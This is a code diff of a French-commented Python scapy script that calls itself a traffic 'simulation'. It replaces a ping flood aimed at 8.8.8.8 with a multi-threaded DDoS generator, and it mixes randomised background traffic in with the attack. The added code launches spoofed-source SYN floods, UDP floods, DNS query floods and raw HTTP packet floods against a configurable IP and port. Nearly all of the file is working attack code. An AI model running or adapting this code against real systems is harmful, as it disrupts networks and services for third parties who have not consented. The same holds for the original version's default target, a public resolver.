@@ -1,50 +1,99 @@
-from scapy.all import *
 import time
 import random
 import threading
-import signal
+from multiprocessing import Process
+from scapy.all import IP, TCP, UDP, ICMP, DNS, send, DNSQR, Raw
+from queue import Queue
 
-# Event pour signaler aux threads de s'arrêter
-exit_event = threading.Event()
+stop_queue = Queue()
+attack_threads = []
 
-def generate_normal_traffic(destination_ip="8.8.8.8"):
-    while not exit_event.is_set():
-        # Créer un paquet ICMP (ping)
-        packet = IP(dst=destination_ip)/ICMP()
+def generate_traffic(destination_ip, destination_port, packet_count):
+    while True:
+        protocols = ["TCP", "UDP", "ICMP"]
+        print("Generation de traffic normal...")
+        for _ in range(packet_count):
+            src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
+            src_port = random.randint(1024, 65535)
+            protocol = random.choice(protocols)
 
-        # Envoyer le paquet
-        send(packet)
+            if protocol == "TCP":
+                packet = IP(src=src_ip, dst=destination_ip) / TCP(sport=src_port, dport=destination_port)
+            elif protocol == "UDP":
+                packet = IP(src=src_ip, dst=destination_ip) / UDP(sport=src_port, dport=destination_port)
+            elif protocol == "ICMP":
+                packet = IP(src=src_ip, dst=destination_ip) / ICMP()
 
-        # Attendre pendant une période de temps normale (en secondes)
-        time.sleep(random.uniform(0.5, 2))
+            send(packet, verbose=0)
+            time.sleep(0.001)
+        time.sleep(3)
 
-def simulate_ddos_attack(destination_ip="8.8.8.8"):
-    while not exit_event.is_set():
-        # Créer un paquet ICMP (ping) pour une attaque DDoS (ping flood)
-        packet = IP(dst=destination_ip)/ICMP(type=8, code=0)
+def generate_ddos_traffic(destination_ip, destination_port, packet_count, attack_duration, num_threads):
+    global attack_threads
+    attack_end_time = time.time() + attack_duration
 
-        # Envoyer le paquet
-        send(packet, loop=True, inter=0.01)  # Envoi en boucle avec un intervalle très court
+    def dns_attack():
+        while time.time() < attack_end_time and not stop_queue.qsize() > 0:
+            src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
+            query_name = "example.com"  # Remplacez par le nom de domaine cible
 
-def signal_handler(sig, frame):
-    print("Arrêt du script.")
-    exit_event.set()
+            packet = IP(src=src_ip, dst=destination_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=query_name))
+            send(packet, verbose=0)
 
-def main():
-    destination_ip = "8.8.8.8"
+    def syn_flood_attack():
+        while time.time() < attack_end_time and not stop_queue.qsize() > 0:
+            src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
+            src_port = random.randint(1024, 65535)
 
-    # Capturer le signal CTRL+C pour permettre l'arrêt propre du script
-    signal.signal(signal.SIGINT, signal_handler)
+            packet = IP(src=src_ip, dst=destination_ip) / TCP(sport=src_port, dport=destination_port, flags="S")
+            send(packet, verbose=0)
 
-    # Générer du trafic normal en parallèle avec la simulation d'attaque DDoS
-    normal_traffic_thread = threading.Thread(target=generate_normal_traffic, args=(destination_ip,))
-    ddos_attack_thread = threading.Thread(target=simulate_ddos_attack, args=(destination_ip,))
+    def udp_lag_attack():
+        while time.time() < attack_end_time and not stop_queue.qsize() > 0:
+            src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
+            src_port = random.randint(1024, 65535)
 
-    normal_traffic_thread.start()
-    ddos_attack_thread.start()
+            packet = IP(src=src_ip, dst=destination_ip) / UDP(sport=src_port, dport=destination_port)
+            send(packet, verbose=0)
 
-    normal_traffic_thread.join()
-    ddos_attack_thread.join()
+    def web_ddos_attack():
+        while time.time() < attack_end_time and not stop_queue.qsize() > 0:
+            src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
+            src_port = random.randint(1024, 65535)
+
+            packet = IP(src=src_ip, dst=destination_ip) / TCP(sport=src_port, dport=destination_port, flags="") / Raw("GET / HTTP/1.1")
+            send(packet, verbose=0)
+
+    # Ajoutez les fonctions d'attaque spécifiques à la liste des threads
+    attack_threads.append(threading.Thread(target=dns_attack))
+    attack_threads.append(threading.Thread(target=syn_flood_attack))
+    attack_threads.append(threading.Thread(target=udp_lag_attack))
+    attack_threads.append(threading.Thread(target=web_ddos_attack))
+
+    # Lancez tous les threads
+    for thread in attack_threads:
+        thread.start()
 
 if __name__ == "__main__":
-    main()
+    destination_ip = "192.168.1.1"  # Remplacez par l'adresse IP de votre destination
+    destination_port = 80  # Remplacez par le port de votre destination
+    ddos_traffic_count = 500
+    attack_duration = 10  # Durée totale de l'attaque en secondes
+    num_threads = 10  # Nombre de threads d'attaque
+    normal_traffic_count = 30
+
+    print("\nSimulation trafic...")
+    ddos_process = Process(target=generate_ddos_traffic, args=(destination_ip, destination_port, ddos_traffic_count, attack_duration, num_threads,))
+    ddos_process.start()
+
+    normal_process = Process(target=generate_traffic, args=(destination_ip, destination_port, normal_traffic_count,))
+    normal_process.start()
+
+    try:
+        while True:
+            time.sleep(0.1)
+    except KeyboardInterrupt:
+        print("Terminating processes...")
+        normal_process.terminate()
+        ddos_process.terminate()
+    print("End.")
